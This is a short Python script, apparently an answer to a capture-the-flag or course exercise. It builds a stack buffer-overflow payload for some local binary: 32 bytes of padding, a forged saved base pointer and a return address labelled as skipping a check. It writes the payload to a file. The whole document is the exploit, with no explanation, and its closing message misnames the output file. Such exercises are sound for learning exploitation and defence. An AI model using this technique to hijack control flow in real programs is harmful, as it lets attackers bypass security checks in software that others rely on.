padding = b'A' * 32
fake_rbp = b'\x00\x36\x40\x00\x00\x00\x00\x00' # 0x403600
skip_check_addr = b'\x2b\x12\x40\x00\x00\x00\x00\x00' # 0x40122b
payload = padding + fake_rbp + skip_check_addr
# Write the payload to a file
with open("ans3_ver2.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans3_ber2.txt")